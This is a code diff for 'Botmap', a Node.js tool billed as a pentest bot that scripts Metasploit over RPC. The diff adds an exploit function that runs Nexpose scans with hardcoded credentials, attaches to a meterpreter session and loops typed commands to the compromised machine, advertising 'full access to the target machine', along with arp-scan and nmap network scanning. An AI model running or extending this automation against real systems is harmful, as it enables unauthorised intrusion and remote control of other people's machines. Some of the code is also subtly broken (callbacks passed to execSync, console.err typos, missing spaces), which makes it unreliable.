@@ -63,8 +63,8 @@ function onConnect(err, token) {
     console.error(_safe2.default.error('Could not connect \n' + err));
     process.exit(1);
   } else {
-    console.log(_safe2.default.info('connected'));
     userInteraction();
+    console.log(_safe2.default.info('connected'));
   }
 }
 //create console fx
@@ -91,7 +91,7 @@ function startConsole() {
   return id;
 }
 
-/* SERVER FUNCTIONS
+/* --- SERVER FUNCTIONS
 function startServer() {
   console.log(c.info('Starting server ! '))
   execSync('msfrpcd -U bot -P botpass -f ', (err, stdout, stderr) => {
@@ -143,8 +143,19 @@ function switchWorkspace(console_id) {
 
 /* ---- END SETUP FUNCTIONS | EXPLOIT FUNCTIONS ---- */
 
-function scan(target, console_id) {
-  var args = ['console.write', console_id, 'db_nmap -sS -sV -sU -n -0' + target + '\n'];
+function macScan(target) {
+  (0, _child_process.execSync)('arp-scan -l -I', function (err, stdout, stderr) {
+    if (err || stderr) {
+      var error = err || stderr;
+      console.error(_safe2.default.error('An error occured \n' + error));
+    } else {
+      console.log(stdout);
+    }
+  });
+}
+
+function portScan(target, console_id) {
+  var args = ['console.write', console_id, 'db_nmap -sS -sV -sU -n -O' + target + '\n'];
   client.exec(args, function (err, r) {
     if (err) {
       console.error(_safe2.default.error('Could not scan target [' + target + ']' + err));
@@ -163,6 +174,92 @@ function scan(target, console_id) {
     }
   });
 }
+
+function exploit(target, console_id) {
+  console.log(_safe2.default.info('starting scan... \n loading nexpose module'));
+  //load nexpose
+  console.log(_safe2.default.info('loading nexpose...'));
+  var args = ['console.write', console_id, 'load nexpose'];
+  client.exec(args, function (err, res) {
+    if (err) {
+      console.error(_safe2.default.error('Could not load nexpose module ! \n ' + err));
+      process.exit(1);
+    } else {
+      console.log(_safe2.default.info('Done ! '));
+    }
+  });
+  //start full nexpose audit
+  console.log(_safe2.default.info('logging in to nexpose...'));
+  args = ['console.write', console_id, 'nexpose_connect bot:botpass@127.0.0.1'];
+  client.exec(args, function (err, res) {
+    if (err) {
+      console.error(_safe2.default.err('Could not log in to local nexpose service !' + err));
+      process.exit(1);
+    } else {
+      console.log(_safe2.default.info('Done !'));
+    }
+  });
+  //start scan
+  console.log(_safe2.default.info('Starting actual scan now... '));
+  args = ['console.write', console_id, 'nexpose_scan -x' + target];
+  client.exec(args, function (err, res) {
+    if (err) {
+      console.error(_safe2.default.error('Could not scan' + target + '\n' + err));
+      process.exit(1);
+    } else {
+      console.log(_safe2.default.info('Done ! '));
+    }
+  });
+  //meterpreter if possible
+  console.log(_safe2.default.info('Trying to connect using meterpreter...'));
+  args = ['console.write', console_id, 'sessions -i 1'];
+  client.exec(args, function (err, res) {
+    if (err) {
+      console.error(_safe2.default.error('Could not connect to target [' + target + '] \n' + err));
+      process.exit(1);
+    } else {
+      console.log(_safe2.default.info('Looks like botmap was able to connect ! \n' + res));
+    }
+  });
+  args = ['console.read', console_id];
+  client.exec(args, function (err, res) {
+    if (err) {
+      console.error(_safe2.default.error('An error occured \n' + err));
+    } else {
+      console.log(res);
+    }
+  });
+  console.log(_safe2.default.info('Now entering prompt-execute loop \n You should have full access to the target machine ! \n Type botmap-exit to exit the loop !'));
+  while (true) {
+    var remoteCommand = _promptSync2.default.prompt();
+    if (remoteCommand == 'botmap-exit') {
+      console.log(_safe2.default.info('Starting disconnection process...'));
+      client.exec('core.stop', function (err, res) {
+        if (err) {
+          console.err(_safe2.default.error('Could not stop \n' + err));
+        } else {
+          console.log(_safe2.default.info('Everything has been shutdown ! Have a nice day =]'));
+        }
+      });
+      return false;
+    }
+    args = ['console.write', console_id, remoteCommand];
+    client.exec(args, function (err, res) {
+      if (err) {
+        console.error(_safe2.default.error('An error occured: \n ' + err));
+      }
+    });
+    args = ['console.read', console_id];
+    client.exec(args, function (err, res) {
+      if (err) {
+        console.error(_safe2.default.error('An error occured \n' + err));
+      } else {
+        console.log(res);
+      }
+    });
+  }
+}
+
 /* ---- END EXPLOIT FUNCTIONS | USER MENU ---- */
 function userInteraction() {
   var userArgs = process.argv.slice(2);
@@ -175,15 +272,15 @@ function userInteraction() {
     var id = startConsole();
     startConsole();
     switchWorkspace(id);
-    scan(userArgs[1], id);
+    exploit(userArgs[1], id);
   } else if (userArgs[0] == 'about' || userArgs[0] == '-a') {
-    console.log(_safe2.default.info('----------------------------------------------'));
+    console.log(_safe2.default.info('-----------------------------------------------------------------'));
     console.log(_safe2.default.info('Botmap, a pentest bot ! '));
     console.log(_safe2.default.info('Author: Coretool'));
     console.log(_safe2.default.info('License: MIT '));
-    console.log(_safe2.default.info('Note that I am not responsible for \n what you do with botmap'));
+    console.log(_safe2.default.info('Note that I am not responsible for what you do with botmap'));
     console.log(_safe2.default.info('Visit github.com/coretool/botmap for more !'));
-    console.log(_safe2.default.info('----------------------------------------------'));
+    console.log(_safe2.default.info('-----------------------------------------------------------------'));
   } else if (userArgs[0] == 'help' || userArgs[0] == '-h') {
     console.log('Help screen goes here'); //to do add help
   } else if (userArgs[0] == 'setup' || userArgs[0] == '-s') {
